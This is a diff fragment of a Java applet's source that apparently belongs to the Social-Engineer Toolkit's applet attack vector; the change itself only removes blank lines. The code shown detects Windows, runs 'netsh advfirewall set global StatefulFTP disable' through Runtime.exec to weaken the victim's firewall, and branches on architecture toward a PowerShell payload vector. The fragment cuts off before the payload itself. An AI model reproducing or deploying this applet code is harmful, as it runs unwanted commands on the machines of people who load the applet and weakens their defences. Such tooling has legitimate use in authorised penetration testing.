@@ -221,18 +221,15 @@ public class Java extends Applet {
            }
 
     	    // Here is where we define OS type, i.e. windows, linux, osx, etc.
-
             if ( osType < 1 ) // If we're running Windows 
             {
                         // attempt to disable statefulftp if running as an administrator
                         f = Runtime.getRuntime().exec("netsh advfirewall set global StatefulFTP disable");
                         // powershell x86 or 64 bit
-
                         if (thirdParm.length() > 3) 
                         {
                         // this detection is for the new powershell vector, it will run a special command if the flag is turned on in SET
                         if (arch.contains("86") || arch.contains("64"))
-				
                                 {
                                 // this will be 64 bit
                                 if (fourthParm.length() > 3)
